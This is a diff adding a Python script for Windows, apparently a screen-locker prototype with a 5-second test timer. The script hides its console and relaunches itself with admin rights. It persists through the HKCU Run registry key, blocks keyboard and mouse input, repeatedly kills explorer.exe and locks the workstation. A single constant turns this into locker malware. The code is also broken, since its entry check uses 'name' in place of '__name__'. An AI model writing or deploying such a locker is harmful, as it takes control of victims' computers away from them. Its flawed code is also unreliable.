@@ -1,0 +1,117 @@
+import os
+import sys
+import time
+import ctypes
+import getpass
+import subprocess
+from datetime import datetime, timedelta
+from pathlib import Path
+
+# ================= НАСТРОЙКИ =================
+LOCK_DURATION_HOURS = 0     # 0 часов
+LOCK_DURATION_SECONDS = 5   # ← вот здесь 5 секунд для теста
+LOCK_FILE_NAME = "test5s.lock"
+PERSISTENT_DIR = Path(r"C:\Users\Public")
+# ==============================================
+
+def hide_console():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
+
+def add_to_startup():
+    if getattr(sys, 'frozen', False):
+        exe_path = sys.executable
+    else:
+        exe_path = sys.argv[0]
+        if not exe_path.lower().endswith(".py"):
+            exe_path = f'pythonw.exe "{exe_path}"'
+
+    key_name = "TestLock5s"
+    cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{exe_path}" /f'
+    try:
+        subprocess.run(cmd, shell=True, check=True, capture_output=True)
+    except:
+        pass
+
+def get_lock_path():
+    username = getpass.getuser().lower()
+    marker = abs(hash(username + os.getenv("COMPUTERNAME", "noname"))) % 100000
+    return PERSISTENT_DIR / f".{LOCK_FILE_NAME}.{marker:05d}"
+
+def main():
+    hide_console()
+
+    lock_path = get_lock_path()
+
+    if lock_path.exists():
+        try:
+            ts_str = lock_path.read_text(encoding="utf-8").strip()
+            lock_time = datetime.fromisoformat(ts_str)
+            delta = timedelta(hours=LOCK_DURATION_HOURS, seconds=LOCK_DURATION_SECONDS)
+            if datetime.now() < lock_time + delta:
+                # ещё не прошло → блочим
+                pass
+            else:
+                # время вышло → чистим
+                try:
+                    os.remove(lock_path)
+                except:
+                    pass
+                # убираем из автозагрузки
+                subprocess.run(
+                    f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TestLock5s" /f',
+                    shell=True, capture_output=True
+                )
+                return
+        except:
+            lock_path.unlink(missing_ok=True)
+
+    # Ставим лок
+    end_time = datetime.now() + timedelta(hours=LOCK_DURATION_HOURS, seconds=LOCK_DURATION_SECONDS)
+    lock_path.write_text(end_time.isoformat(), encoding="utf-8")
+
+    add_to_startup()
+
+    # Блокировка на время теста
+    start = time.time()
+    while time.time() - start < LOCK_DURATION_SECONDS + 1:
+        try:
+            ctypes.windll.user32.BlockInput(True)
+            ctypes.windll.user32.ShowCursor(False)
+            os.system("taskkill /f /im explorer.exe >nul 2>&1")
+            ctypes.windll.user32.LockWorkStation()
+        except:
+            pass
+        time.sleep(0.3)
+
+    # Конец теста — чистим
+    try:
+        os.remove(lock_path)
+    except:
+        pass
+    subprocess.run(
+        'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TestLock5s" /f',
+        shell=True, capture_output=True
+    )
+
+    # Возвращаем проводник, если убили
+    try:
+        subprocess.Popen("explorer.exe")
+    except:
+        pass
+
+    ctypes.windll.user32.BlockInput(False)
+    ctypes.windll.user32.ShowCursor(True)
+
+if name == "__main__":
+    if not is_admin():
+        params = " ".join([f'"{arg}"' for arg in sys.argv])
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        sys.exit(0)
+
+    main()
